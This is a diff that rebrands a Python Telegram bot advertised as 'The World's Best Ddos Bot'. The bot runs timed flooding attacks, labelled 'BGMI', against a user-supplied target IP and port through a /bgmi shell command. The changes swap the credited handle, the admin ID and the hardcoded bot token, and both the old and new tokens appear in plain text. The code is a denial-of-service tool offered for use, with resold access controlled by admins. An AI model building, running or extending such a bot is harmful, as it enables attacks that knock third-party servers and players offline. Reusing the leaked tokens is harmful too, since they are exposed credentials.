@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#By @SS_GAMING007
+#By @hsrxgamingofficial02
 
 import telebot
 import subprocess
@@ -8,10 +8,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7424547362:AAEcJp3nPAkCE9mZ8GF_grGndhhVtA5STzU')
+bot = telebot.TeleBot('7373325899:AAFas_GliwysjVSCiMP9knBwwuRVaWwm0-U')
 
 # Admin user IDs
-admin_id = ["5746667496"]
+admin_id = ["6767507519"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy @SS_GAMING007"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy @hsrxgamingofficial02"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -246,9 +246,9 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBy @SS_GAMING007"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\nBy @hsrxgamingofficial02"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBy @SS_GAMING007"
+        response = "You Are Not Authorized To Use This Command.\nBy @hsrxgamingofficial02"
 
     bot.reply_to(message, response)
 
@@ -285,7 +285,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By @SS_GAMING007
+ By @hsrxgamingofficial02
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -300,7 +300,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @SS_GAMING007"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @hsrxgamingofficial02"
     bot.reply_to(message, response)
 
 
@@ -344,7 +344,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By @SS_GAMING007
+By @hsrxgamingofficial02
 '''
     bot.reply_to(message, response)
 
